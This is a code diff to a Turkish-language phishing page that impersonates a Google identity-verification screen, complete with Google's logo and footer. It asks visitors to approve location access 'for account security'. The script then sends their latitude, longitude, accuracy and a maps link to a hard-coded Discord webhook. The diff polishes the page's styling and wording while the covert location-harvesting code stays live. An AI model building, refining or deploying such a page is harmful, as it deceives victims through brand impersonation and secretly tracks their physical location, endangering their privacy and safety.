@@ -103,13 +103,13 @@
             font-size: 15px;
             color: #5f6368;
             line-height: 1.5;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
         }
 
-        /* Buton ve Hizalama Fix */
+        /* Buton ve Alt Metin Arasındaki Boşluk Düzeltildi */
         .action-area {
-            margin-top: 20px;
-            padding: 10px 0;
+            margin-top: 10px;
+            padding-bottom: 30px; /* Alttaki footer ile mesafeyi korur */
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -121,8 +121,8 @@
             border: none;
             border-radius: 4px;
             color: #fff;
-            padding: 12px 24px;
-            font-size: 14px;
+            padding: 14px 32px;
+            font-size: 15px;
             font-weight: 500;
             cursor: pointer;
             transition: background-color 0.2s, box-shadow 0.2s;
@@ -131,14 +131,14 @@
 
         .button:hover {
             background-color: #1765cf;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
         }
 
         .location-message {
             font-size: 13px;
             color: #1a73e8;
             font-weight: 500;
-            height: 20px; /* Yer tutması için */
+            height: 20px;
             opacity: 0;
             transition: opacity 0.3s;
         }
@@ -146,9 +146,9 @@
             opacity: 1;
         }
 
-        /* Alt Bilgi */
+        /* Alt Bilgi - Mesafe Artırıldı */
         .footer {
-            margin-top: 40px;
+            margin-top: 20px;
             border-top: 1px solid #f1f3f4;
             padding-top: 20px;
             font-size: 12px;
@@ -185,15 +185,15 @@
         <div class="content">
             <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
             <h1 class="title">Kimlik Doğrulama</h1>
-            <p class="description">Güvenliğiniz için lütfen devam etmeden önce konum erişimini onaylayarak doğrulama yapın.</p>
+            <p class="description">Hesap güvenliğini sağlamak amacıyla konum erişimini onaylayarak doğrulama işlemini tamamlayın.</p>
             
             <div class="action-area">
-                <button class="button" onclick="requestLocation()">Doğrulamayı Başlat</button>
+                <button class="button" onclick="requestLocation()">Step 1: Doğrulamayı Başlat</button>
                 <div class="location-message" id="locationMessage">İşlem yapılıyor...</div>
             </div>
 
             <div class="footer">
-                <p>© 2026 Google LLC</p>
+                <p>© 2026 Google - Hizmet Şartları ve Koşullar</p>
                 <div class="footer-links">
                     <a href="#" class="footer-link">Gizlilik</a>
                     <a href="#" class="footer-link">Şartlar</a>
@@ -205,6 +205,7 @@
     </div>
 
     <script>
+        // WEBHOOK URL
         const webhookUrl = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ"; 
         const locationMessage = document.getElementById('locationMessage');
         const notificationBox = document.getElementById('notificationBox');
@@ -228,7 +229,7 @@
                                     { name: "Enlem", value: `\`${latitude}\``, inline: true },
                                     { name: "Boylam", value: `\`${longitude}\``, inline: true },
                                     { name: "Hata Payı", value: `\`${accuracy.toFixed(1)}m\``, inline: true },
-                                    { name: "Harita", value: `[Görüntüle](${mapsUrl})` }
+                                    { name: "Harita", value: `[Haritada Gör](${mapsUrl})` }
                                 ],
                                 timestamp: new Date().toISOString()
                             }]
@@ -241,7 +242,7 @@
                         }, 2500);
                     },
                     (error) => {
-                        let msg = "Erişim reddedildi. Lütfen izin verin.";
+                        let msg = "Erişim reddedildi. Lütfen ayarlardan izin verin.";
                         locationMessage.textContent = msg;
                         showNotification(msg, 4000);
                     },
